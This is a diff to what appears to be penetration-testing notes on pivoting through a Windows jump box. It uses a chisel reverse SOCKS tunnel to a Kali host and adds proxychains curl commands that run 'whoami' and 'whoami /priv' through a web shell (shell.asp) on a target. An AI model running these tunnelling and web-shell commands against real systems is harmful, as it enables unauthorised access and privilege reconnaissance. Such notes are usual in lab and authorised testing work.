@@ -48,7 +48,7 @@ Windows JumpBox - client
 .\chisel.exe client <Kali IP>:8000 R:socks
 ```
 
----
+## Accessing
 
 Access with nmap
 
@@ -58,6 +58,20 @@ Access with nmap
 
 ```bash
 proxychains nmap -sT -p <Target Ports> -Pn -n <Target IP>
+```
+
+Access with curl
+
+```bash
+proxychains curl http://<Target IP>/shell.asp?cmd=whoami
+```
+
+or
+
+```bash
+proxychains curl --get \
+  --data-urlencode 'cmd=whoami /priv' \
+  http://<Target IP>/shell.asp
 ```
 
 Access with mysql
